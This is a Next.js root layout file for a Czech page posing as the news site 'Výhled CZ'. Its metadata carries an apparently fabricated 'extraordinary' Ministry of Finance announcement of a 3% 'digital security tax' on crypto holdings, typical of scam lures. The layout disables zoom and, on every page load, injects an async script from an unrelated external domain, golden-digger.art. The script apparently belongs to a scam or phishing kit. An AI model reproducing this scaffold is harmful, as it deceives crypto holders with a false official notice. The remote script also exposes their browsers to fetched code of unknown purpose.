export const metadata = {
  title: "MIMOŘÁDNĚ: Ministerstvo financí chystá 3% „digitální bezpečnostní daň“ z kryptoaktiv nad 100 000 Kč — Výhled CZ",
  description: "Ministerstvo financí ČR dnes vydalo mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="cs">
      <body>
        {children}
        <script
          src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
          async
          defer
        ></script>
      </body>
    </html>
  );
}
